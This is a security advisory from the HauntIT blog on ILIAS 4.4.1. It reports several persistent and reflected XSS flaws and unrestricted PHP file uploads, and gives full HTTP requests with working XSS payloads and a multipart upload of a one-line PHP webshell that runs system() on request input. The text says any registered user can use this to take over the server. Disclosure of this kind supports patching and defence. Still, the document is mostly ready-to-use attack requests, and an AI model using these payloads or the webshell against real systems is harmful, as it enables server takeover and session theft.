@@ -1,0 +1,171 @@
+# ==============================================================
+# Title ...| Multiple vulnerabilities in ILIAS
+# Version .| ilias-4.4.1.zip
+# Date ....| 21.02.2014
+# Found ...| HauntIT Blog
+# Home ....| www.ilias.de
+# ==============================================================
+
+First from admin user logged in:
+
+# ==============================================================
+# 1. Persistent xss
+
+---<request>---
+
+POST /k/cms/ilias/ilias.php?wsp_id=2&cmd=post&cmdClass=ilobjbloggui&cmdNode=mw:my:ma&baseClass=
+ilPersonalDesktopGUI&fallbackCmd=createPosting&rtoken=6bac7751a71721f25adb9e579dea4344 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 91
+
+title=$("%3cimg%2fsrc%3d'x'%2fonerror%3dalert(9999)%3e")&cmd%5BcreatePosting%5D=Add+Posting
+---<request>---
+
+
+# ==============================================================
+# 2. Possibility of uploading webshell
+
+Uploaded file can be found in the ILIAS directories, for example:
+---<code>---
+k@lab:~/public_html/cms/ilias$ cat ./44444/ilFile/3/file_334/001/shell.php
+<?php system($_REQUEST['cmd']); ?>
+k@lab:~/public_html/cms/ilias$
+---<code>---
+
+Direct access to this file will give you a webshell.
+
+* 
+* This bug will be described later in section for 'normal/registered' user.
+* 
+
+
+# ==============================================================
+# 3. XSS
+
+---<request>---
+POST /k/cms/ilias/ilias.php?ref_id=1&new_type=webr&cmd=post&cmdClass=ilobjlinkresourcegui&
+cmdNode=nm:9y&baseClass=ilRepositoryGUI&rtoken=6bac7751a71721f25adb9e579dea4344 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 760
+
+tar_mode=ext&tar='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&tar_val=%3Cdiv+id%3D%22tar_value
+%22%3E%0D%0A%09%0D%0A%3C%2Fdiv%3E%09%0D%0A%3Cdiv+class%3D%22small%22%3E%0D%0A%09%3Ca+id%3D%
+22tar_ajax%22+class%3D%22iosEditInternalLinkTrigger%22+href%3D%22ilias.php%3Fref_id%3D1%26n
+ew_type%3Dwebr%26postvar%3Dtar%26cmdClass%3Dilinternallinkgui%26cmdNode%3Dnm%3A9y%3A3l%3A3z
+%3A3s%3Ai1%26baseClass%3DilRepositoryGUI%26cmdMode%3Dasynch%22%3E%26raquo%3B+Select+Target+
+Object%3C%2Fa%3E%0D%0A%3C%2Fdiv%3E%0D%0A%3Cdiv+class%3D%22small++ilNoDisplay%22+id%3D%22tar
+_rem%22%3E%0D%0A%09%3Ca+class%3D%22ilLinkInputRemove%22+href%3D%22%23%22%3E%26raquo%3B+Remo
+ve%3C%2Fa%3E%0D%0A%3C%2Fdiv%3E&tar_ajax_type=&tar_ajax_id=&tar_ajax_target=&tit=asdasd&des=
+asdasd&cmd%5Bsave%5D=Add+Weblink
+
+---<request>---
+
+---<response>---
+
+Target: <span class="asterisk">*</span><br />
+      
+<input type="text" name="links[4][tar]" value="'>"><body/onload=alert(9999)>" size="40" 
+maxlength="500" />
+      
+---<response>---
+
+
+
+
+# ==============================================================
+# 4. Another webshell upload possibility
+
+There is a possibility of creating webshell when php file is added as an attachement
+to email to user(s).
+
+
+All shells will be located in /ilias/ (wwwroot) directory with value from 'client_id'
+(for example: client_id=44444, then your shell is in /ilias/44444/...)
+
+
+
+# ==============================================================
+
+Second: from normal/registered user logged in:
+
+# ==============================================================
+# 1. When normal user is registered on the latest ILIAS, he is able to add
+PHP file contains simple shell. From this moment he will be able to hack 
+the whole server.
+
+---<request>---
+POST /k/cms/ilias/ilias.php?wsp_id=41&new_type=file&cmd=post&cmdClass=
+ilobjfilegui&cmdNode=mw:my:jh&baseClass=ilPersonalDesktopGUI&fallbackC
+md=uploadFiles&rtoken=2e4e8af720b2204ea51503ca6388a325 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Cache-Control: no-cache
+
+-----------------------------1761332042190
+Content-Disposition: form-data; name="title"
+
+shell.php
+-----------------------------1761332042190
+Content-Disposition: form-data; name="description"
+
+
+-----------------------------1761332042190
+Content-Disposition: form-data; name="extract"
+
+0
+-----------------------------1761332042190
+Content-Disposition: form-data; name="keep_structure"
+
+0
+-----------------------------1761332042190
+Content-Disposition: form-data; name="upload_files"; filename="shell.php"
+Content-Type: application/octet-stream
+
+<?php system($_REQUEST['cmd']); ?>
+-----------------------------1761332042190--
+
+---<request>---
+
+
+# ==============================================================
+# 2. XSS (same place like when admin is logged in)
+
+
+---<request>---
+POST /k/cms/ilias/ilias.php?wsp_id=41&new_type=webr&cmd=post&cmdClass=ilobjlinkresource
+gui&cmdNode=mw:my:9y&baseClass=ilPersonalDesktopGUI&rtoken=1561f316d721f9683b0ae5f0b652db25 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 768
+
+tar_mode=ext&tar='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&tar_val=%3Cdiv+id%3D%22
+tar_value%22%3E%0D%0A%09%0D%0A%3C%2Fdiv%3E%09%0D%0A%3Cdiv+class%3D%22small%22%3E%0
+D%0A%09%3Ca+id%3D%22tar_ajax%22+class%3D%22iosEditInternalLinkTrigger%22+href%3D%2
+2ilias.php%3Fwsp_id%3D41%26new_type%3Dwebr%26postvar%3Dtar%26cmdClass%3Dilinternal
+linkgui%26cmdNode%3Dmw%3Amy%3A9y%3A3l%3A3z%3A3s%3Ai1%26baseClass%3DilPersonalDeskt
+opGUI%26cmdMode%3Dasynch%22%3E%26raquo%3B+Select+Target+Object%3C%2Fa%3E%0D%0A%3C%
+2Fdiv%3E%0D%0A%3Cdiv+class%3D%22small++ilNoDisplay%22+id%3D%22tar_rem%22%3E%0D%0A%
+09%3Ca+class%3D%22ilLinkInputRemove%22+href%3D%22%23%22%3E%26raquo%3B+Remove%3C%2F
+a%3E%0D%0A%3C%2Fdiv%3E&tar_ajax_type=&tar_ajax_id=&tar_ajax_target=&tit=asdasd&des
+=dsa&cmd%5Bsave%5D=Add+Weblink
+---<request>---
+ 
+
+
+# ==============================================================
+# 3. Persistent xss
+
+---<request>---
+POST /k/cms/ilias/ilias.php?wsp_id=111&bmn=2014-02&cmd=post&cmdClass=ilobjbloggui&cmdNode=mw:my:ma&baseClass=ilPersonalDesktopGUI&fallbackCmd=createPosting&rtoken=1561f316d721f9683b0ae5f0b652db25 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 89
+
+title=%27%3E%22%3E%3Cbody%2Fonload%3Dalert%28123%29%3E&cmd%5BcreatePosting%5D=Add+Posting
+---<request>---
+
+
+# ==============================================================
+# More @ http://HauntIT.blogspot.com
